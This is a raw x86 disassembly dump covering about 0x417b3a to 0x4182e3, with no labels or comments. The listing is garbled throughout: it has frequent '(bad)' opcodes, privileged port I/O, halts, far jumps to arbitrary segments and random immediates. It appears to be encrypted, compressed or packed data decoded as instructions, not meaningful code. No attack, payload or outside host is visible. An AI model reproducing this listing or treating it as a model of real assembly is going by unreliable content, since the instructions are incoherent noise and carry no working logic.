  417b3a:	pop    ebp
  417b3b:	sbb    cl,BYTE PTR [esi-0x14daaf7c]
  417b41:	jle    0x417b91
  417b43:	jae    0x417b72
  417b45:	dec    esp
  417b46:	clc    
  417b47:	mov    bl,BYTE PTR [esi]
  417b49:	mov    edi,0xc304e1eb
  417b4e:	sti    
  417b4f:	pop    ebx
  417b50:	fld    DWORD PTR [edi+eiz*1+0x54]
  417b54:	fild   WORD PTR [edi+esi*2-0xad96ae2]
  417b5b:	cwde   
  417b5c:	jmp    0xc4b3e9e
  417b61:	rcl    BYTE PTR [eax],cl
  417b63:	(bad)
  417b66:	pop    edx
  417b67:	rcl    DWORD PTR ds:0x3df3f499,cl
  417b6d:	pop    ss
  417b6e:	and    dh,ch
  417b70:	call   FWORD PTR [ecx]
  417b72:	nop
  417b73:	add    BYTE PTR [edi+0x2f42a9de],0xea
  417b7a:	out    0x1a,al
  417b7c:	jle    0x417b38
  417b7e:	cmp    eax,0x2ec29c0c
  417b83:	jge    0x417b2a
  417b85:	and    eax,0x5797214e
  417b8a:	(bad)  
  417b8b:	push   eax
  417b8c:	out    dx,eax
  417b8d:	(bad)  
  417b8e:	xchg   ebp,eax
  417b8f:	je     0x417b3c
  417b91:	xor    eax,0x52624297
  417b96:	sbb    al,0x6d
  417b98:	inc    sp
  417b9a:	fdiv   DWORD PTR [ebp-0x79752287]
  417ba0:	out    0xb6,al
  417ba2:	or     dh,BYTE PTR [edx]
  417ba4:	sbb    al,0xb5
  417ba6:	xor    ecx,DWORD PTR [edx+0x23]
  417ba9:	call   0x50e4:0xfb3bf317
  417bb0:	sub    edi,ebx
  417bb2:	ss in  al,dx
  417bb4:	xor    BYTE PTR [esi-0x5f],dh
  417bb7:	xchg   edi,eax
  417bb8:	xor    DWORD PTR [edi],0x9f2766d2
  417bbe:	adc    al,BYTE PTR [ecx]
  417bc0:	jge    0x417c41
  417bc2:	sbb    DWORD PTR [ebx+esi*4],0x663e0318
  417bc9:	(bad)  
  417bca:	push   ebx
  417bcb:	jne    0x417b51
  417bcd:	mov    ecx,DWORD PTR [esi]
  417bcf:	push   ecx
  417bd0:	jbe    0x417b54
  417bd2:	or     ecx,DWORD PTR [ebp-0x407fc96a]
  417bd8:	clc    
  417bd9:	mov    ebx,0xb6b710c4
  417bde:	mov    bl,BYTE PTR [ecx]
  417be0:	sub    bh,0x3c
  417be3:	fisubr WORD PTR [edx-0x40549977]
  417be9:	stc    
  417bea:	sub    BYTE PTR [edx],ch
  417bec:	pop    edi
  417bed:	or     esi,DWORD PTR [edx+0x5d]
  417bf0:	pop    ebp
  417bf1:	ins    BYTE PTR es:[edi],dx
  417bf2:	sbb    BYTE PTR [ecx],cl
  417bf4:	(bad)  
  417bf6:	adc    al,0x2d
  417bf8:	and    ah,BYTE PTR [ebx-0x78]
  417bfb:	xor    eax,0xfa4ee4a8
  417c00:	and    BYTE PTR [ebx],dl
  417c02:	inc    esp
  417c03:	imul   ebp,DWORD PTR [ebp+0xd],0x3f
  417c07:	inc    ebx
  417c08:	cmp    al,0x24
  417c0a:	mov    dh,0x1f
  417c0c:	pop    DWORD PTR [ebp+eax*4+0x2c]
  417c10:	xlat   BYTE PTR ds:[ebx]
  417c11:	xor    eax,0x87e627a4
  417c16:	out    dx,al
  417c17:	and    ecx,DWORD PTR [eax+0x1d]
  417c1a:	je     0x417c94
  417c1c:	sub    DWORD PTR es:[ecx-0x78],edx
  417c20:	jp     0x417c34
  417c22:	retf   0xcfca
  417c25:	jnp    0x417c8a
  417c27:	out    dx,al
  417c28:	inc    ecx
  417c29:	mov    edi,0x5f4e0a9b
  417c2e:	mov    ?,ebp
  417c30:	fcomp  DWORD PTR [eax]
  417c32:	push   edx
  417c33:	sub    ch,BYTE PTR [eax]
  417c35:	pop    es
  417c36:	mov    ds:0xf4386341,eax
  417c3b:	fist   WORD PTR [eax]
  417c3d:	retf   0xc00c
  417c40:	shl    DWORD PTR [ebp+ebx*4-0x766980af],1
  417c47:	jl     0x417c68
  417c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c4a:	cmp    ecx,eax
  417c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c4d:	or     eax,0xbf7d12c9
  417c52:	sar    DWORD PTR [ecx-0x59f9efe2],0xf0
  417c59:	xor    eax,0xa15b841a
  417c5e:	sub    BYTE PTR [eax+edx*2-0x78cf5ffb],ch
  417c65:	xlat   BYTE PTR ds:[ebx]
  417c66:	loope  0x417c45
  417c68:	dec    ebp
  417c69:	ret    0xffd0
  417c6c:	leave  
  417c6d:	cmp    bl,BYTE PTR [ecx-0x5eb8fe5d]
  417c73:	jo     0x417c7e
  417c75:	(bad)  
  417c76:	imul   ebp,DWORD PTR [ebx+0x77625f37],0xe
  417c7d:	mov    ebp,0xf3aa1180
  417c82:	rol    DWORD PTR [ecx+0x1b93d40],0x2f
  417c89:	or     al,0x74
  417c8b:	mov    esi,0x1f911f39
  417c90:	lock das 
  417c92:	inc    ebp
  417c93:	add    al,0xd
  417c95:	sbb    DWORD PTR [esi+0x72],0xeb4fb20c
  417c9c:	push   esp
  417c9d:	aaa    
  417c9e:	int    0x3
  417ca0:	jmp    0x417d17
  417ca2:	lods   al,BYTE PTR ds:[esi]
  417ca3:	iret   
  417ca4:	mov    dl,0x2
  417ca6:	jb     0x417cae
  417ca8:	xor    ebx,esp
  417caa:	cmp    esp,DWORD PTR [edi+0x209e27e8]
  417cb0:	ins    DWORD PTR es:[edi],dx
  417cb1:	mov    BYTE PTR [edi+0x40],dh
  417cb4:	mov    eax,0x4078e521
  417cb9:	retf   
  417cba:	mov    ebp,0xf6a27e14
  417cbf:	adc    DWORD PTR [ebp-0x14],ecx
  417cc2:	popf   
  417cc3:	inc    edi
  417cc4:	push   cs
  417cc5:	cs pop esp
  417cc7:	out    dx,al
  417cc8:	test   DWORD PTR [esi+0x3f],ebp
  417ccb:	adc    al,0x43
  417ccd:	scas   al,BYTE PTR es:[edi]
  417cce:	mov    eax,0xde3fbdb2
  417cd3:	xchg   edi,eax
  417cd4:	xchg   ebx,eax
  417cd5:	in     al,dx
  417cd6:	mov    ss,WORD PTR [edx-0x53]
  417cd9:	lea    eax,[eax]
  417cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cdc:	jae    0x417d13
  417cde:	or     ecx,edx
  417ce0:	in     al,dx
  417ce1:	dec    esi
  417ce2:	cmp    DWORD PTR [edi+0x7787f03e],eax
  417ce8:	ins    BYTE PTR es:[edi],dx
  417ce9:	mov    bl,ah
  417ceb:	push   ecx
  417cec:	jle    0x417d21
  417cee:	sub    dl,ch
  417cf0:	and    al,BYTE PTR [eax-0x3959b89]
  417cf6:	and    eax,0x81e2a595
  417cfb:	fsubr  QWORD PTR [edi+0x7dda3f7a]
  417d01:	int3   
  417d02:	sbb    ebp,esi
  417d04:	cdq    
  417d05:	ins    BYTE PTR es:[edi],dx
  417d06:	jp     0x417d12
  417d08:	ja     0x417d39
  417d0a:	pop    edi
  417d0b:	ret    0xec87
  417d0e:	xchg   esp,eax
  417d0f:	inc    edx
  417d10:	dec    esp
  417d11:	cdq    
  417d12:	mov    ds:0x5ffac703,al
  417d17:	mov    ecx,0xad6fa252
  417d1c:	fsub   QWORD PTR [edx+ecx*8-0x1087f78b]
  417d23:	std    
  417d24:	pop    esi
  417d25:	xor    DWORD PTR [eax-0x6faf28c2],ecx
  417d2b:	stos   BYTE PTR es:[edi],al
  417d2c:	and    ah,dh
  417d2e:	sub    al,BYTE PTR ds:0xf9cd31dc
  417d34:	sahf   
  417d35:	(bad)  
  417d36:	shl    BYTE PTR [edi+0x27259474],1
  417d3c:	pop    ds
  417d3d:	mov    WORD PTR [esi+0x14],?
  417d40:	icebp  
  417d41:	call   0xe0d5e3f5
  417d46:	cmp    DWORD PTR ds:0x20945682,esi
  417d4c:	add    DWORD PTR [ecx],ecx
  417d4e:	inc    esp
  417d4f:	inc    eax
  417d50:	add    eax,eax
  417d52:	pop    es
  417d53:	into   
  417d54:	mov    BYTE PTR [esi-0xb],cl
  417d57:	inc    edx
  417d58:	jb     0x417dce
  417d5a:	and    DWORD PTR [ebx-0x6ee1c01c],0x1
  417d61:	inc    ebx
  417d62:	cdq    
  417d63:	dec    edi
  417d64:	(bad)  
  417d65:	jge    0x417daf
  417d67:	test   al,0x6e
  417d69:	daa    
  417d6a:	inc    DWORD PTR [bp+si-0x2b]
  417d6e:	adc    al,0x37
  417d70:	aad    0x2e
  417d72:	push   ebp
  417d73:	pop    ebp
  417d74:	and    bh,BYTE PTR [edx+esi*8]
  417d77:	dec    esi
  417d78:	call   0xada2:0xfb4cac62
  417d7f:	outs   dx,BYTE PTR ds:[esi]
  417d80:	inc    esi
  417d81:	and    ch,BYTE PTR [esi]
  417d83:	sbb    ecx,DWORD PTR [ebp-0x8605ac3]
  417d89:	xor    BYTE PTR [ebx+0x5f0c01f7],ah
  417d8f:	ins    DWORD PTR es:[edi],dx
  417d90:	(bad)  
  417d91:	mov    ebx,0xcd2fc5d3
  417d96:	test   al,0xb
  417d98:	inc    esi
  417d99:	stos   DWORD PTR es:[edi],eax
  417d9a:	(bad)  
  417d9c:	pop    ss
  417d9d:	jl     0x417e07
  417d9f:	dec    eax
  417da0:	aad    0xa3
  417da2:	cmp    BYTE PTR [eax],0x88
  417da5:	push   ss
  417da6:	sbb    dl,BYTE PTR [ebx+edx*8-0x12eeb6cd]
  417dad:	sti    
  417dae:	or     al,cl
  417db0:	inc    ecx
  417db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417db2:	mov    DWORD PTR [edi-0x5a],edi
  417db5:	or     ebp,DWORD PTR [ebx+eiz*4-0x7a]
  417db9:	in     al,dx
  417dba:	mov    ch,0xd
  417dbc:	stos   BYTE PTR es:[edi],al
  417dbd:	sar    ebp,1
  417dbf:	pop    esi
  417dc0:	inc    eax
  417dc1:	shl    DWORD PTR [ebx-0x2f],1
  417dc4:	cmp    dh,al
  417dc6:	cmc    
  417dc7:	sbb    DWORD PTR [edx+ecx*2],edi
  417dca:	or     al,0x39
  417dcc:	fs mov bh,0x1a
  417dcf:	cwde   
  417dd0:	mov    cl,0x4b
  417dd2:	jmp    0xe22c:0xf17a22a7
  417dd9:	pop    ecx
  417dda:	mov    eax,0x408f0dd0
  417ddf:	hlt    
  417de0:	icebp  
  417de1:	mov    gs,WORD PTR [edx]
  417de3:	push   ss
  417de4:	or     eax,0x5f687a20
  417de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dea:	mov    edi,0xd34f726a
  417def:	cmp    ah,BYTE PTR [eax+0x7f6eb7bc]
  417df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417df7:	mov    al,BYTE PTR [ecx-0x13]
  417dfa:	adc    bl,ch
  417dfc:	cwde   
  417dfd:	imul   eax,DWORD PTR [eax+0x16],0x0
  417e01:	daa    
  417e02:	repnz add al,0x6f
  417e05:	adc    BYTE PTR [edi+0x6],dl
  417e08:	les    edx,FWORD PTR [edi]
  417e0a:	mov    bl,0x52
  417e0c:	mov    esi,0xb19bd40a
  417e11:	xchg   edx,eax
  417e12:	test   DWORD PTR [esi+0xf2e8ee8],0xf0f00156
  417e1c:	(bad)  
  417e1d:	aad    0x0
  417e1f:	aad    0x98
  417e21:	stc    
  417e22:	mov    bh,0x12
  417e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e25:	(bad)  
  417e26:	and    al,0x69
  417e28:	pop    ecx
  417e29:	pop    ss
  417e2a:	loopne 0x417dc8
  417e2c:	fucom  st(7)
  417e2e:	cwde   
  417e2f:	adc    bl,BYTE PTR [eax+esi*4-0x12]
  417e33:	addr16 call 0x2c49c0ec
  417e39:	scas   al,BYTE PTR es:[edi]
  417e3a:	pop    ebp
  417e3b:	xchg   ebp,eax
  417e3c:	je     0x417e8b
  417e3e:	push   es
  417e3f:	popa   
  417e40:	mov    edi,DWORD PTR [ebp-0x77]
  417e43:	adc    esp,DWORD PTR [esi-0x40a0fafe]
  417e49:	test   DWORD PTR [edi+edi*8-0x37],ebp
  417e4d:	out    dx,al
  417e4e:	add    dh,BYTE PTR [ebx-0x2c10b21a]
  417e54:	sar    edi,0x60
  417e57:	test   BYTE PTR ds:0xc2b964fd,dh
  417e5d:	loopne 0x417e3c
  417e5f:	mov    edx,0xbb68b87f
  417e64:	pop    edx
  417e65:	std    
  417e66:	or     eax,0xf756f88c
  417e6b:	data16 jne 0x417dfc
  417e6e:	and    al,0x9d
  417e70:	fistp  WORD PTR [edi]
  417e72:	xchg   esi,eax
  417e73:	sub    al,0xcf
  417e75:	sub    al,0x20
  417e77:	push   ds
  417e78:	adc    al,0x70
  417e7a:	stc    
  417e7b:	dec    ecx
  417e7c:	ret    
  417e7d:	xchg   esi,eax
  417e7e:	or     cl,BYTE PTR [edx]
  417e80:	cmp    BYTE PTR [ebp-0x79],dl
  417e83:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  417e85:	sub    dl,ch
  417e87:	fld    QWORD PTR ds:0xa3b7960e
  417e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e8e:	repz scas eax,DWORD PTR es:[edi]
  417e90:	inc    esp
  417e91:	jmp    FWORD PTR [edi]
  417e93:	(bad)  
  417e94:	in     eax,0x69
  417e96:	xchg   ecx,eax
  417e97:	add    DWORD PTR [ecx+0x5b39749b],ecx
  417e9d:	mov    ah,0xbe
  417e9f:	mov    bl,0xed
  417ea1:	sbb    eax,0x4298b2d
  417ea6:	bound  edi,QWORD PTR [eax+0x98d9f0f]
  417eac:	mov    cl,0x9b
  417eae:	retf   
  417eaf:	cmp    ebx,DWORD PTR [ecx]
  417eb1:	xlat   BYTE PTR cs:[ebx]
  417eb3:	mov    bh,dl
  417eb5:	mov    edi,0x3c87b913
  417eba:	xlat   BYTE PTR ds:[ebx]
  417ebb:	jmp    0x4b0ac71e
  417ec0:	fadd   QWORD PTR [ebx+0x2f]
  417ec3:	dec    ecx
  417ec4:	xor    al,0x88
  417ec6:	jecxz  0x417ee6
  417ec8:	push   esp
  417ec9:	jne    0x417efe
  417ecb:	mov    ebp,0x82778621
  417ed0:	fwait
  417ed1:	cmp    bh,BYTE PTR [ebx+0x790739bc]
  417ed7:	fiadd  DWORD PTR [esi+0x11]
  417eda:	pushf  
  417edb:	mov    bl,0x86
  417edd:	stc    
  417ede:	push   esi
  417edf:	adc    bl,BYTE PTR [esi+0x50d1dd04]
  417ee5:	mov    bl,0xb9
  417ee7:	dec    eax
  417ee8:	add    al,0x8d
  417eea:	fsub   DWORD PTR [esi+0x1029b3c0]
  417ef0:	sub    DWORD PTR [edi],ecx
  417ef2:	mov    ebx,0xb57ad840
  417ef7:	pause  
  417ef9:	adc    dl,BYTE PTR ds:[ebp+0x1076649f]
  417f00:	push   edx
  417f01:	cs jmp 0x417ef3
  417f04:	stos   DWORD PTR es:[edi],eax
  417f05:	bnd ret 0x5fa9
  417f09:	ror    DWORD PTR [ebp-0x50],cl
  417f0c:	retf   0xf040
  417f0f:	and    dl,BYTE PTR [ebp+0x69]
  417f12:	mov    ebp,0x8582bcd2
  417f17:	sub    DWORD PTR [ebp+0x6a9a089b],edi
  417f1d:	cmp    BYTE PTR [ebx+0x4b],0xb3
  417f21:	pop    es
  417f22:	push   esi
  417f23:	lds    ecx,FWORD PTR [ebx-0x1a5d3969]
  417f29:	les    esi,FWORD PTR [eax]
  417f2b:	js     0x417ef4
  417f2d:	cmp    bl,BYTE PTR [ebp+0x51db5702]
  417f33:	stos   BYTE PTR es:[edi],al
  417f34:	or     DWORD PTR [edx+0x315c3890],esi
  417f3a:	in     al,0xba
  417f3c:	jnp    0x417ec0
  417f3e:	push   esp
  417f3f:	daa    
  417f40:	out    dx,al
  417f41:	inc    esi
  417f42:	jp     0x417f5a
  417f44:	dec    edi
  417f45:	jg     0x417f21
  417f47:	inc    ebx
  417f48:	mov    ch,al
  417f4a:	xor    BYTE PTR [edx+0xacc3d8b],0xa4
  417f51:	xchg   edx,eax
  417f52:	std    
  417f53:	xchg   BYTE PTR [eax+0x587c428],bh
  417f59:	xchg   esp,eax
  417f5a:	jp     0x417f5e
  417f5c:	mov    ds:0x76ab5172,al
  417f61:	shr    BYTE PTR [edi],0x9f
  417f64:	push   edi
  417f65:	add    dh,0x63
  417f68:	jmp    0xe88e8eae
  417f6d:	ret    
  417f6e:	ret    
  417f6f:	gs lahf 
  417f71:	jge    0x417f4d
  417f73:	jmp    0x417f6f
  417f75:	inc    ebp
  417f76:	mov    al,0x87
  417f78:	stc    
  417f79:	mov    ds:0xcee27296,al
  417f7e:	pop    edi
  417f7f:	in     al,dx
  417f80:	cmp    al,0x82
  417f82:	mov    DWORD PTR [eax+ecx*1+0x77],esi
  417f86:	dec    esp
  417f87:	adc    DWORD PTR cs:[edx-0x6a416f91],0x7d944630
  417f92:	and    DWORD PTR [edx-0x63],ecx
  417f95:	mov    ch,0x91
  417f97:	add    BYTE PTR [esi-0x7c1e0e8d],0xd
  417f9e:	outs   dx,BYTE PTR ds:[esi]
  417f9f:	(bad)  
  417fa0:	pop    edi
  417fa1:	jb     0x417f4e
  417fa3:	ins    BYTE PTR es:[edi],dx
  417fa4:	jle    0x417f9f
  417fa6:	jecxz  0x417f88
  417fa8:	sub    eax,0x5d5f9599
  417fad:	mov    ebp,esi
  417faf:	inc    ebx
  417fb0:	inc    ebx
  417fb1:	mov    al,0x3c
  417fb3:	std    
  417fb4:	mov    ebx,DWORD PTR [esi-0x31]
  417fb7:	pop    ebp
  417fb8:	data16 jnp 0x418012
  417fbb:	adc    al,0x81
  417fbd:	dec    esp
  417fbe:	repnz mov ah,0xa1
  417fc1:	shl    BYTE PTR [eax],0xb8
  417fc4:	jbe    0x417f6d
  417fc6:	in     eax,dx
  417fc7:	inc    ebp
  417fc8:	cmp    ecx,ebx
  417fca:	pop    ebx
  417fcb:	std    
  417fcc:	add    al,0x7e
  417fce:	int    0x4a
  417fd0:	fidivr DWORD PTR [ebp-0x49]
  417fd3:	ret    0xc806
  417fd6:	ins    DWORD PTR es:[edi],dx
  417fd7:	sbb    DWORD PTR [eax-0x67e8b365],0x79921fdd
  417fe1:	mov    bh,ah
  417fe3:	dec    eax
  417fe4:	scas   al,BYTE PTR es:[edi]
  417fe5:	push   0x57
  417fe7:	jp     0x418048
  417fe9:	mov    eax,ds:0x56e7be2
  417fee:	cmc    
  417fef:	(bad)  
  417ff0:	jns    0x417fd4
  417ff2:	aad    0x9f
  417ff4:	out    dx,eax
  417ff5:	mov    ds:0x3b996d0e,al
  417ffa:	xor    al,0xb1
  417ffc:	das    
  417ffd:	mov    bh,0xc3
  417fff:	dec    esp
  418000:	dec    esp
  418001:	rcr    BYTE PTR [ebp+eax*1-0x8],0xcf
  418006:	jmp    0x417fe3
  418008:	je     0x417f8f
  41800a:	xor    BYTE PTR [eax+0x44],bh
  41800d:	scas   eax,DWORD PTR es:[edi]
  41800e:	fidivr DWORD PTR [ebp+0x276cc667]
  418014:	cs jl  0x418039
  418017:	sub    ecx,ecx
  418019:	sbb    BYTE PTR [edx-0x46],dh
  41801c:	clc    
  41801d:	xor    DWORD PTR [edx+0x20400277],0x50535fe7
  418027:	or     BYTE PTR [ecx],bh
  418029:	arpl   WORD PTR [eax],dx
  41802b:	or     cl,BYTE PTR [eax-0x35384411]
  418031:	in     eax,0xc6
  418033:	mov    bl,0x28
  418035:	jmp    0xb73e:0x9b37bd8a
  41803c:	adc    DWORD PTR [edx+0x371073],ebx
  418042:	mov    al,0x42
  418044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418045:	popa   
  418046:	lahf   
  418047:	push   edx
  418048:	arpl   WORD PTR [ebx-0x15e883db],cx
  41804e:	pusha  
  41804f:	dec    esi
  418050:	push   eax
  418051:	sub    DWORD PTR [ebx-0x24],ebx
  418054:	cmp    bh,bh
  418056:	sub    DWORD PTR [esi+0x7f31e299],esp
  41805c:	fld    QWORD PTR [ecx]
  41805e:	shl    ecx,cl
  418060:	icebp  
  418061:	mov    ebx,0x5cffb0ac
  418066:	push   esp
  418067:	out    dx,eax
  418068:	sti    
  418069:	and    al,0xc6
  41806b:	mov    ?,WORD PTR [ecx]
  41806d:	and    ebp,DWORD PTR [eax]
  41806f:	inc    ebp
  418070:	jg     0x418005
  418072:	loop   0x41806c
  418074:	outs   dx,BYTE PTR ds:[esi]
  418075:	(bad)  
  418076:	out    dx,eax
  418077:	sahf   
  418078:	ret    0x7e53
  41807b:	xchg   edi,eax
  41807c:	pusha  
  41807d:	cli    
  41807e:	repz sbb DWORD PTR [eax-0x72bcfebf],ebp
  418085:	push   0x6a
  418087:	aad    0x81
  418089:	xchg   esi,eax
  41808a:	pop    ecx
  41808b:	loop   0x418032
  41808d:	nop
  41808e:	jg     0x41808a
  418090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418091:	cmp    eax,0x76bc63d3
  418096:	std    
  418097:	or     ecx,ebx
  418099:	xchg   ebp,eax
  41809a:	or     edx,DWORD PTR [eax-0x2a]
  41809d:	xchg   ecx,eax
  41809e:	sar    dh,1
  4180a0:	sar    BYTE PTR [ecx+0xa3258dc],1
  4180a6:	arpl   ax,dx
  4180a8:	push   0x4
  4180aa:	in     al,0xb5
  4180ac:	fwait
  4180ad:	push   edx
  4180ae:	ja     0x4180ee
  4180b0:	sub    eax,0x5091a8e7
  4180b5:	dec    eax
  4180b6:	ss mov ch,0x4f
  4180b9:	add    DWORD PTR [ebx+0x70],esi
  4180bc:	out    0x59,al
  4180be:	dec    esp
  4180bf:	gs loope 0x41810c
  4180c2:	into   
  4180c3:	clc    
  4180c4:	aas    
  4180c5:	lods   eax,DWORD PTR ds:[esi]
  4180c6:	ds jnp 0x418060
  4180c9:	mov    ecx,0xaccfd855
  4180ce:	mov    al,ds:0x9bb52847
  4180d3:	sub    al,0xb9
  4180d5:	mov    edi,0xca4a4e44
  4180db:	stc    
  4180dc:	mov    eax,DWORD PTR [ebx+0x3cd5139d]
  4180e2:	in     eax,0x10
  4180e4:	mov    ds,edx
  4180e6:	cmc    
  4180e7:	mov    ebx,0x91cf5953
  4180ec:	pop    ebx
  4180ed:	ins    DWORD PTR es:[edi],dx
  4180ee:	pop    edi
  4180ef:	test   al,0xc5
  4180f1:	leave  
  4180f2:	add    BYTE PTR [ebp-0xe6cc849],ah
  4180f8:	cmp    bh,bl
  4180fa:	and    DWORD PTR [ebp+0x5d],esp
  4180fd:	scas   eax,DWORD PTR es:[edi]
  4180fe:	jno    0x41808b
  418100:	or     al,0x53
  418102:	jnp    0x418157
  418104:	pop    es
  418105:	jo     0x418091
  418107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418108:	stos   DWORD PTR es:[edi],eax
  418109:	xor    dl,dh
  41810b:	bound  edx,QWORD PTR [eax+edx*4-0x79583a02]
  418112:	lea    edx,[edi+0x33]
  418115:	sbb    al,0x7c
  418117:	push   ds
  418118:	inc    esp
  418119:	push   ebx
  41811a:	xor    bl,BYTE PTR fs:[ebx-0x24]
  41811e:	pushf  
  41811f:	mov    eax,ds:0x7bca1083
  418124:	push   ss
  418125:	dec    ebp
  418126:	icebp  
  418127:	(bad)  
  418129:	jg     0x418195
  41812b:	aas    
  41812c:	lds    ecx,FWORD PTR [ebx+ebx*4-0x5a6e396b]
  418133:	out    0xb5,eax
  418135:	test   eax,0x85fac378
  41813a:	out    0xb4,al
  41813c:	add    ebx,eax
  41813e:	js     0x418170
  418140:	mov    ah,0x35
  418142:	xchg   BYTE PTR [ebx+0x53],dh
  418145:	mov    cl,0xa5
  418147:	xchg   ebx,eax
  418148:	daa    
  418149:	and    al,0x30
  41814b:	scas   eax,DWORD PTR es:[edi]
  41814c:	push   0xbcd78ac8
  418151:	sbb    DWORD PTR [esi+0x39],edx
  418154:	mov    ds:0x561a219c,al
  418159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41815a:	aad    0x71
  41815c:	hlt    
  41815d:	inc    esi
  41815e:	enter  0x46e8,0x67
  418162:	(bad)  
  418163:	cmp    DWORD PTR [edx+0x20c064e9],ecx
  418169:	stc    
  41816a:	lock hlt 
  41816c:	push   0xffffffea
  41816e:	adc    eax,0x110d76af
  418173:	das    
  418174:	sub    DWORD PTR [esi-0x3f004617],ecx
  41817a:	cld    
  41817b:	mov    ebx,0x88c6613b
  418180:	xchg   esp,ecx
  418182:	jb     0x418183
  418184:	pop    esi
  418185:	jg     0x4181ce
  418187:	loope  0x4181ac
  418189:	push   ebp
  41818a:	lock stos BYTE PTR es:[edi],al
  41818c:	push   cs
  41818d:	pushf  
  41818e:	je     0x4181a4
  418190:	sahf   
  418191:	mov    ebx,0x7811c9f8
  418196:	into   
  418197:	push   edi
  418198:	in     al,0x26
  41819a:	aam    0x8f
  41819c:	dec    ebx
  41819d:	scas   eax,DWORD PTR es:[edi]
  41819e:	(bad)  
  41819f:	xor    BYTE PTR [esi],bh
  4181a1:	or     BYTE PTR [esi+edx*2+0xf0779b2],bh
  4181a8:	cmc    
  4181a9:	jmp    0x5b830504
  4181ae:	data16 cs mov bh,0x93
  4181b2:	and    ch,cl
  4181b4:	mov    esp,0xe9be19f7
  4181b9:	sub    eax,DWORD PTR ds:0xaec99cba
  4181bf:	push   ebx
  4181c0:	jbe    0x418225
  4181c2:	popa   
  4181c3:	int    0x86
  4181c5:	ffree  st(7)
  4181c7:	gs sub edx,edx
  4181ca:	scas   al,BYTE PTR es:[edi]
  4181cb:	inc    edi
  4181cc:	xchg   edx,eax
  4181cd:	stos   BYTE PTR es:[edi],al
  4181ce:	add    ecx,ecx
  4181d0:	dec    DWORD PTR [ecx]
  4181d2:	mov    al,ds:0xc5198233
  4181d7:	dec    edi
  4181d8:	leave  
  4181d9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181db:	sbb    DWORD PTR [eax-0x6b],eax
  4181de:	jmp    0xc6eb:0xed4379b2
  4181e5:	xor    al,0x70
  4181e7:	fwait
  4181e8:	retf   0x197a
  4181eb:	sbb    al,0xa6
  4181ed:	xchg   DWORD PTR [eax+0x5603af0],edi
  4181f3:	pop    esp
  4181f4:	sbb    al,0xeb
  4181f6:	pop    eax
  4181f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181f8:	stos   DWORD PTR es:[edi],eax
  4181f9:	fisttp WORD PTR [eax]
  4181fb:	into   
  4181fc:	rcr    BYTE PTR [edx-0x8],1
  4181ff:	and    BYTE PTR [eax+0x8],cl
  418202:	and    ebx,esp
  418204:	mov    cl,0x44
  418206:	sub    esp,esp
  418208:	add    esp,DWORD PTR [ebx+0x24e4e3b4]
  41820e:	ret    0xabc1
  418211:	test   BYTE PTR [edx+edx*8],bh
  418214:	push   0xf5ffc3bc
  418219:	adc    DWORD PTR [ecx],0x69
  41821c:	js     0x418292
  41821e:	mov    edi,0xf709aae6
  418223:	or     eax,0x9e5b3450
  418228:	test   DWORD PTR [edx+0x4],ebx
  41822b:	fsub   DWORD PTR [esi+0x1ac5a42c]
  418231:	imul   esp,DWORD PTR [edi+0x48],0x2b6987e7
  418238:	add    BYTE PTR fs:[ebp-0x2363e77e],ah
  41823f:	xchg   edi,eax
  418240:	xor    dh,BYTE PTR [ebp+0x43ab3d8b]
  418246:	dec    ebx
  418247:	data16 xor al,0xf6
  41824a:	jg     0x418251
  41824c:	inc    eax
  41824d:	xchg   edx,eax
  41824e:	adc    DWORD PTR [esi],0xffffffa1
  418251:	cmc    
  418252:	push   ebx
  418253:	repnz pushf 
  418255:	mov    esp,0xa1351bac
  41825a:	icebp  
  41825b:	das    
  41825c:	loopne 0x418203
  41825e:	adc    edx,ebp
  418260:	xor    edi,ebp
  418262:	hlt    
  418263:	mov    DWORD PTR [eax-0x25],eax
  418266:	push   es
  418267:	mov    esp,0x35fd2446
  41826c:	fld    QWORD PTR [esi+0x3af2718b]
  418272:	and    ebx,DWORD PTR [ecx]
  418274:	in     al,dx
  418275:	popa   
  418276:	les    ecx,FWORD PTR [ecx+0x3cb91c4f]
  41827c:	div    BYTE PTR [edi]
  41827e:	mov    dh,0xf0
  418280:	pop    ebp
  418281:	inc    edi
  418282:	cs (bad) 
  418284:	jge    0x41820b
  418286:	push   es
  418287:	shl    ah,1
  418289:	mov    ecx,0xfe1cebaf
  41828e:	push   edx
  41828f:	aad    0x3f
  418291:	push   esi
  418292:	fstp   QWORD PTR [ecx-0x28b0039]
  418298:	push   esi
  418299:	or     bh,ah
  41829b:	dec    ebp
  41829c:	js     0x4182ef
  41829e:	xor    bh,BYTE PTR [ebx+0x41]
  4182a1:	and    ch,al
  4182a3:	push   0x56635249
  4182a8:	xchg   BYTE PTR [eax+0x78],dl
  4182ab:	sub    eax,0x9d1728cc
  4182b0:	push   esi
  4182b1:	repnz in eax,0x9e
  4182b4:	out    0xca,al
  4182b6:	mov    edi,0xaa2f85a2
  4182bb:	and    ch,dh
  4182bd:	out    0x26,al
  4182bf:	out    dx,eax
  4182c0:	inc    edx
  4182c1:	mov    eax,ds:0x8bb9dd1a
  4182c6:	xor    ebx,ebp
  4182c8:	sub    al,0x78
  4182ca:	jl     0x41829e
  4182cc:	mov    edi,0x464b16f8
  4182d1:	or     DWORD PTR [ecx-0x61],esp
  4182d4:	xlat   BYTE PTR ds:[ebx]
  4182d5:	gs add al,0x30
  4182d8:	cdq    
  4182d9:	lds    edx,FWORD PTR [eax-0x2b]
  4182dc:	inc    ebp
  4182dd:	fdivr  DWORD PTR [edx+0x56be99bc]
  4182e3:	std    
